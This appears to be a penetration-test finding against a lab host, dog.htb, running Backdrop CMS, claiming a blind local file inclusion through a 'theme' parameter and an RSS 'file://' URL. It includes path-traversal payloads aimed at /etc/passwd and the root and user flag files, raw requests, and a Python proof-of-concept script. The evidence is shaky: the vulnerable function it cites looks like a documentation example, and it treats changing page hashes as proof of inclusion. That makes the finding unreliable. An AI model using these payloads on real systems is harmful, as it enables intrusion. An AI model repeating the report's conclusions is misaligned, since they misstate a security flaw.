# Local File Inclusion via Theme Parameter

**ID:** vuln-0004
**Severity:** MEDIUM
**Found:** 2026-02-24 13:29:05 UTC
**Target:** http://dog.htb
**Method:** GET
**CWE:** CWE-22
**CVSS:** 5.3

## Description

A local file inclusion vulnerability exists in the custom theme handling of Backdrop CMS. The `hook_custom_theme()` in `core/modules/system/system.api.php` directly returns the user-supplied `$_GET['theme']` parameter without validation. This allows an attacker to influence the theme loading mechanism, leading to arbitrary file inclusion. While the inclusion is blind (file contents are not directly output), the included file affects page generation, as evidenced by the changing `view-dom-id` HTML attribute (32-character MD5 hash) that varies based on the included file path.

## Impact

Successful exploitation allows an attacker to:
- Include arbitrary local files on the server
- Read sensitive files via blind techniques (timing attacks, error-based, or out-of-band)
- Potentially achieve remote code execution if combined with file upload or writeable files
- Enumerate filesystem structure through response differences
- Information disclosure through content-dependent page hashes

The blind nature limits immediate impact but provides a foothold for further attacks.

## Technical Analysis

The vulnerability originates in `core/modules/system/system.api.php` in the `hook_custom_theme()` implementation. The code directly returns `$_GET['theme']` as the theme name:

```php
function hook_custom_theme() {
  // Allow the user to request a particular theme via a query parameter.
  if (isset($_GET['theme'])) {
    return $_GET['theme'];
  }
}
```

This value is used by the theme system to load theme files. When a valid theme name is returned, Backdrop attempts to load that theme's `.theme` or `.inc` files. Because the attacker controls this value, they can supply path traversal sequences (e.g., `../../../etc/passwd`) to include arbitrary files from the filesystem.

Confirmed via testing:
- Request: `http://dog.htb/?theme=/etc/passwd`
- Result: Page renders normally, but the `view-dom-id` attribute in the HTML differs from the default page
- The `view-dom-id` value is an MD5 hash that changes based on the included file (observed different hashes for `/etc/passwd`, `/etc/hostname`, `/root/root.txt`, `/home/user/user.txt`)
- Direct file output is not visible (likely because included file does not echo content), making this a blind LFI

Additionally, the RSS feed endpoint `?q=rss.xml` with the `url` parameter accepts `file://` URLs, providing a second LFI vector:
- Request: `http://dog.htb/?q=rss.xml&url=file:///etc/passwd`
- Result: Same blind behavior, page content changes subtly without direct file disclosure

The LFI is confirmed functional but does not directly expose file contents. The attack surface includes any parameter that influences theme selection or URL generation within the RSS feed.

## Proof of Concept

Reproduction steps:

1. Send request to the vulnerable endpoint with a test file path:
   ```
   GET http://dog.htb/?theme=/etc/passwd
   ```
   or
   ```
   GET http://dog.htb/?q=rss.xml&url=file:///etc/passwd
   ```

2. Capture the response and note the `view-dom-id` attribute in the HTML:
   ```html
   <div class="view view-promoted view-id-promoted view-display-id-block view-dom-id-<HASH>">
   ```

3. Compare the hash with a baseline request (without the `theme` parameter). Different hashes confirm file inclusion.

4. The hash is content-dependent; different included files produce different hashes, proving the inclusion occurs server-side.

Example hashes observed:
- Normal page: `df5d428fe983e5e62425d34ea36f2b58`
- With `?theme=/etc/passwd`: `67f321a786b220c800ca03011c7bfb41`
- With `?theme=/root/root.txt`: `deb50a15ee49823c81c67177ebe3c688`
- With `?theme=/home/user/user.txt`: `5c9f14182ec92c7489c882c06fabeb80`

These consistent, deterministic hashes confirm the LFI is functional.

```
import hashlib
import requests

TARGET = "http://dog.htb"

def get_view_dom_id(params):
    """Make request and extract view-dom-id hash from response."""
    url = TARGET + "/?"
    if 'q' in params:
        url += f"q={params['q']}&"
    else:
        url += "q=admin&"
    url += "&".join(f"{k}={v}" for k, v in params.items() if k != 'q')
    
    resp = requests.get(url, timeout=10)
    # Extract view-dom-id
    import re
    match = re.search(r'view-dom-id-([a-f0-9]{32})', resp.text)
    return match.group(1) if match else None

# Baseline
baseline_hash = get_view_dom_id({'theme': 'basis'})
print(f"Baseline hash: {baseline_hash}")

# Test LFI with /etc/passwd
test_hash = get_view_dom_id({'theme': '../../../etc/passwd'})
print(f"With /etc/passwd: {test_hash}")

if test_hash and test_hash != baseline_hash:
    print("[+] LFI confirmed! Hashes differ.")
else:
    print("[-] No difference detected.")
```

## Remediation

1. Remove or restrict the `hook_custom_theme()` implementation. If dynamic theme selection is needed, validate against a strict allowlist of installed theme machine names.
2. Implement path validation: reject any theme parameter containing directory traversal sequences (`..`), absolute paths, or null bytes.
3. Use `backdrop_get_path('theme', $theme)` or equivalent safe APIs instead of directly using user input.
4. Apply the same validation to any RSS feed URL handling to prevent file scheme access.
5. Consider disabling or restricting custom theme switching entirely in production environments.
6. Deploy a WAF rule to block query parameters named `theme` containing `../` or `file://`.
7. Conduct a full code audit for other instances where user input influences file operations without validation.
